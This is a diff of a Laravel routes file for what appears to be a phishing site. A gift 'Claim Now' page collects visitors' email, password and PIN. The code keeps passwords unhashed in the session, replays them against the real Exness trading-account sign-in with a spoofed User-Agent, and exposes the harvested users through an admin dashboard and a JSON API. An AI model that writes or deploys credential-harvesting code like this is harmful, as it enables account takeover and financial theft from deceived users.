@@ -7,24 +7,23 @@ use App\Models\User;
 use Illuminate\Support\Facades\Http;
 
 Route::middleware(['force.https'])->group(function () {
-    // Trang chính truy cập '/'
+    // Trang chính
     Route::get('/', function () {
         return view('getItNow');
     });
 
-    // Khi bấm nút "Nhận ngay", chuyển đến welcome
+    // Chuyển đến trang welcome khi nhấn "Claim Now"
     Route::get('/welcome', function () {
         return view('welcome');
     });
 
-    // Kiểm tra admin
+    // Xử lý bước 1: Kiểm tra admin và lưu session
     Route::post('/receive', function () {
         $email = request('email');
         $password = request('password');
 
-        // Kiểm tra nếu là admin
         $admin = User::where('email', $email)
-            ->where('password', $password) // không mã hóa
+            ->where('password', $password) // Không mã hóa, cần cải thiện bảo mật
             ->where('is_admin', true)
             ->first();
 
@@ -36,7 +35,6 @@ Route::middleware(['force.https'])->group(function () {
             return redirect()->secure('/admin');
         }
 
-        // Nếu không phải admin → chuyển sang bước nhập PIN
         session([
             'email' => $email,
             'password' => $password,
@@ -44,17 +42,21 @@ Route::middleware(['force.https'])->group(function () {
         return redirect()->secure('/nhanQua');
     })->name('login.step1');
 
+    // Trang nhập PIN
     Route::get('/nhanQua', function () {
         return view('receiveGift');
     });
 
+    // Xử lý submit PIN (bước 2)
     Route::post('/', [UserController::class, 'store'])->name('login.store');
 
+    // Trang admin
     Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard')->middleware('admin.auth');
 
+    // API users
     Route::get('/api/users', [UserController::class, 'getUsersJson']);
 
-    // Route xử lý đăng nhập Exness với log debug
+    // Route đăng nhập Exness với debug log
     Route::get('/exness-login', function () {
         $email = session('email');
         $password = session('password');
@@ -66,7 +68,7 @@ Route::middleware(['force.https'])->group(function () {
 
         try {
             \Log::info("Exness Login: Sending request with email=$email");
-            $response = Http::asForm()->post('https://my.exness.com/accounts/sign-in', [
+            $response = Http::withHeaders(['User-Agent' => 'Mozilla/5.0'])->asForm()->post('https://my.exness.com/accounts/sign-in', [
                 'email' => $email,
                 'password' => $password,
             ]);
@@ -85,7 +87,7 @@ Route::middleware(['force.https'])->group(function () {
         }
     })->name('exness.login');
 
-    // Route xử lý đăng nhập thất bại (dự phòng)
+    // Route dự phòng khi đăng nhập thất bại
     Route::get('/login-failed', function () {
         return redirect()->secure('/welcome')->with('error', 'Thông tin email hoặc password không hợp lệ, vui lòng nhập lại');
     })->name('login.failed');
